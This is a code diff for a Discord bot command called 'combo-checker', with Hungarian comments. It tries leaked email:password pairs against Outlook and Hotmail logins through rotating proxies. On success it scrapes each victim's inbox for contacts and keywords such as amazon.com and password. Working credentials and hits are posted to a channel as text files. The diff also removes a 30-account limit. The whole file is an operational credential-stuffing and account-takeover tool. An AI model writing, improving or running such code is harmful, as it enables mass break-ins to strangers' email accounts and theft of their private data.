@@ -20,7 +20,6 @@ class ProxyManager {
 
 async function checkCombo(email, password, keywords, proxy) {
     try {
-        // Step 1: Login attempt
         const loginData = new URLSearchParams({
             loginfmt: email,
             passwd: password,
@@ -52,27 +51,23 @@ async function checkCombo(email, password, keywords, proxy) {
         let keywordHits = [];
         let contacts = [];
         
-        // Login success?
         if (loginDataLower.includes('outlook.live.com') || 
             loginDataLower.includes('office.com') || 
             loginDataLower.includes('mail.live.com') ||
-            !loginDataLower.includes('incorrect') && 
-            !loginDataLower.includes('invalid') &&
-            !loginDataLower.includes('hiba')) {
+            (!loginDataLower.includes('incorrect') && 
+             !loginDataLower.includes('invalid') &&
+             !loginDataLower.includes('hiba'))) {
             valid = true;
         }
         
-        // KEYWORDS in LOGIN RESPONSE
         keywords.forEach(keyword => {
             if (loginDataLower.includes(keyword.toLowerCase())) {
                 keywordHits.push(keyword);
             }
         });
         
-        // Step 2: If login success, check CONTACTS/INBOX
         if (valid) {
             try {
-                // Try to access inbox/contacts
                 const inboxResponse = await axios({
                     method: 'GET',
                     url: 'https://outlook.live.com/mail/inbox',
@@ -92,7 +87,6 @@ async function checkCombo(email, password, keywords, proxy) {
                 const inboxHtml = inboxResponse.data.toLowerCase();
                 const $ = cheerio.load(inboxHtml);
                 
-                // Extract emails from inbox/contacts
                 $('a[href*="mail"], .email, [title*="mail"], [data-email]').each((i, el) => {
                     const emailText = $(el).text().toLowerCase().trim();
                     if (emailText.includes('@') && emailText.length > 10) {
@@ -105,7 +99,6 @@ async function checkCombo(email, password, keywords, proxy) {
                     }
                 });
                 
-                // Also check response text for contacts
                 $('body').text().split('\n').forEach(line => {
                     const lineLower = line.toLowerCase().trim();
                     keywords.forEach(keyword => {
@@ -115,15 +108,13 @@ async function checkCombo(email, password, keywords, proxy) {
                     });
                 });
                 
-            } catch (inboxError) {
-                // Inbox access failed, continue
-            }
+            } catch (inboxError) {}
         }
         
         return { 
             valid, 
             keywordHits, 
-            contacts: [...new Set(contacts)], // unique
+            contacts: [...new Set(contacts)],
             proxy: proxy || 'Direct' 
         };
         
@@ -136,7 +127,6 @@ module.exports = {
     data: new SlashCommandBuilder()
         .setName('combo-checker')
         .setDescription('🔥 Combo + Proxy + Keywords + CONTACTS checker')
-        // 1. Kötelező opciók elöl
         .addAttachmentOption(option =>
             option.setName('combo')
                 .setDescription('Combo list (email:pass)')
@@ -145,7 +135,6 @@ module.exports = {
             option.setName('keywords')
                 .setDescription('Keywords & Contacts (rockstargames.com,amazon.com,admin,password)')
                 .setRequired(true))
-        // 2. Nem kötelező opciók utána
         .addAttachmentOption(option =>
             option.setName('proxies')
                 .setDescription('Proxy list (ip:port)')
@@ -167,7 +156,6 @@ module.exports = {
             .map(kw => kw.trim().toLowerCase())
             .filter(kw => kw.length > 1);
         
-        // Download combo
         const comboBuffer = await fetch(comboFile.url).then(r => r.arrayBuffer());
         const comboText = Buffer.from(comboBuffer).toString('utf-8');
         
@@ -178,7 +166,6 @@ module.exports = {
             proxies = proxyText.split('\n').map(p => p.trim()).filter(p => p);
         }
         
-        // Parse combos
         const combos = comboText.split('\n')
             .map(line => line.trim())
             .filter(line => line.includes(':'))
@@ -189,8 +176,7 @@ module.exports = {
                     pass: parts[1] ? parts[1].trim() : '' 
                 };
             })
-            .filter(combo => combo.email.includes('@hotmail') || combo.email.includes('@outlook'))
-            .slice(0, 30); // Max 30
+            .filter(combo => combo.email.includes('@hotmail') || combo.email.includes('@outlook'));
         
         const proxyManager = new ProxyManager(proxies);
         
@@ -207,8 +193,8 @@ module.exports = {
         await interaction.editReply({ embeds: [progressEmbed] });
         
         let stats = { valid: 0, invalid: 0, keywordHits: 0, contactHits: 0 };
-        let hitCombos = [];
-        let contactList = [];
+        let hitCombos = []; // Kulcsszavas találatok
+        let validOnlyCombos = []; // Csak működő fiókok találat nélkül
         
         for (let i = 0; i < combos.length; i++) {
             const combo = combos[i];
@@ -218,76 +204,74 @@ module.exports = {
             
             if (result.valid) {
                 stats.valid++;
-                await outputChannel.send(`✅ **${combo.email}**:${combo.pass}\n📍 Proxy: ${result.proxy}`);
+                
+                if (result.keywordHits.length > 0 || result.contacts.length > 0) {
+                    const hitLine = `${combo.email}:${combo.pass} | Keywords: ${result.keywordHits.join(',')} | Contacts: ${result.contacts.join(',')} | Proxy: ${result.proxy}`;
+                    hitCombos.push(hitLine);
+                    stats.keywordHits += result.keywordHits.length;
+                    stats.contactHits += result.contacts.length;
+                } else {
+                    validOnlyCombos.push(`${combo.email}:${combo.pass} | Proxy: ${result.proxy}`);
+                }
             } else {
                 stats.invalid++;
             }
             
-            // 🔥 KEYWORD HITS
-            if (result.keywordHits.length > 0) {
-                stats.keywordHits += result.keywordHits.length;
-                result.keywordHits.forEach(hit => {
-                    outputChannel.send(`🔥 **KEYWORD HIT!** \`${combo.email}\` → **${hit.toUpperCase()}**`);
-                });
+            // Csak az Embed-et frissítjük, üzenetet nem küldünk cikluson belül
+            if (i % 5 === 0 || i === combos.length - 1) {
+                progressEmbed.spliceFields(3, 1, 
+                    { name: '📊 Progress', value: `${i + 1}/${combos.length}`, inline: true }
+                );
+                await interaction.editReply({ embeds: [progressEmbed] });
             }
-            
-            // 🔥 CONTACT HITS (noreply@rockstargames.com stb.)
-            if (result.contacts.length > 0) {
-                stats.contactHits += result.contacts.length;
-                result.contacts.forEach(contact => {
-                    const contactMsg = `📧 **CONTACT HIT!** \`${combo.email}\` → **${contact}**`;
-                    outputChannel.send(contactMsg);
-                    contactList.push(`${combo.email}:${combo.pass} | ${contact}`);
-                });
-            }
-            
-            // Save hits
-            if (result.keywordHits.length > 0 || result.contacts.length > 0) {
-                const hitLine = `${combo.email}:${combo.pass} | Keywords: ${result.keywordHits.join(',')} | Contacts: ${result.contacts.join(',')} | Proxy: ${result.proxy}`;
-                hitCombos.push(hitLine);
-            }
-            
-            // Progress update
-            progressEmbed.spliceFields(3, 1, 
-                { name: '📊 Progress', value: `${i + 1}/${combos.length}`, inline: true }
-            );
-            await interaction.editReply({ embeds: [progressEmbed] });
             
             await new Promise(r => setTimeout(r, 3000));
         }
         
-        // FINAL RESULTS
         const finalEmbed = new EmbedBuilder()
             .setTitle('✅ CHECK KÉSZ!')
             .addFields(
                 { name: '📊 Total', value: combos.length.toString(), inline: true },
-                { name: '✅ Valid', value: stats.valid.toString(), inline: true },
-                { name: '🔥 Keywords', value: stats.keywordHits.toString(), inline: true },
-                { name: '📧 Contacts', value: stats.contactHits.toString(), inline: true }
+                { name: '✅ Valid Összes', value: stats.valid.toString(), inline: true },
+                { name: '🔥 Hits (Keywords)', value: hitCombos.length.toString(), inline: true },
+                { name: '📧 Sima Valid', value: validOnlyCombos.length.toString(), inline: true }
             )
             .setColor(0x00ff00);
         
         await interaction.editReply({ embeds: [finalEmbed] });
         
-        // 🔥 HITS TXT
-        if (hitCombos.length > 0 || contactList.length > 0) {
-            const txtContent = `🔥 ULTIMATE HITS (${hitCombos.length + contactList.length})\n` +
-                `Time: ${new Date().toISOString()}\n` +
-                `Keywords/Contacts: ${keywords.join(', ')}\n\n` +
-                [...hitCombos, ...contactList].join('\n') + '\n\n' +
-                `Valid: ${stats.valid} | Keyword hits: ${stats.keywordHits} | Contacts: ${stats.contactHits}`;
+        // 1. Fájl küldése: Kulcsszavas találatok (ULTIMATE HITS)
+        if (hitCombos.length > 0) {
+            const hitContent = `🔥 ULTIMATE HITS (${hitCombos.length})\n` +
+                `Time: ${new Date().toISOString()}\n\n` +
+                hitCombos.join('\n');
             
-            const fileName = `ultimate_hits_${Date.now()}.txt`;
-            const filePath = path.join(__dirname, '..', fileName);
-            fs.writeFileSync(filePath, txtContent);
+            const hitFileName = `ultimate_hits_${Date.now()}.txt`;
+            const hitPath = path.join(__dirname, '..', hitFileName);
+            fs.writeFileSync(hitPath, hitContent);
             
-            const attachment = new AttachmentBuilder(filePath, { name: fileName });
             await outputChannel.send({
-                content: `📥 **${hitCombos.length + contactList.length} ULTIMATE HITS TXT!**`,
-                files: [attachment]
+                content: `📥 **KULCSSZAVAS TALÁLATOK (${hitCombos.length})**`,
+                files: [new AttachmentBuilder(hitPath, { name: hitFileName })]
             });
+            fs.unlinkSync(hitPath);
+        }
+
+        // 2. Fájl küldése: Csak működő fiókok találat nélkül (VALID ONLY)
+        if (validOnlyCombos.length > 0) {
+            const validContent = `✅ VALID EMAILEK (KULCSSZÓ NÉLKÜL) (${validOnlyCombos.length})\n` +
+                `Time: ${new Date().toISOString()}\n\n` +
+                validOnlyCombos.join('\n');
             
-            fs.unlinkSync(filePath);
+            const validFileName = `valid_only_${Date.now()}.txt`;
+            const validPath = path.join(__dirname, '..', validFileName);
+            fs.writeFileSync(validPath, validContent);
+            
+            await outputChannel.send({
+                content: `📥 **CSAK VALID EMAILEK (${validOnlyCombos.length})**`,
+                files: [new AttachmentBuilder(validPath, { name: validFileName })]
+            });
+            fs.unlinkSync(validPath);
         }
     }
 };
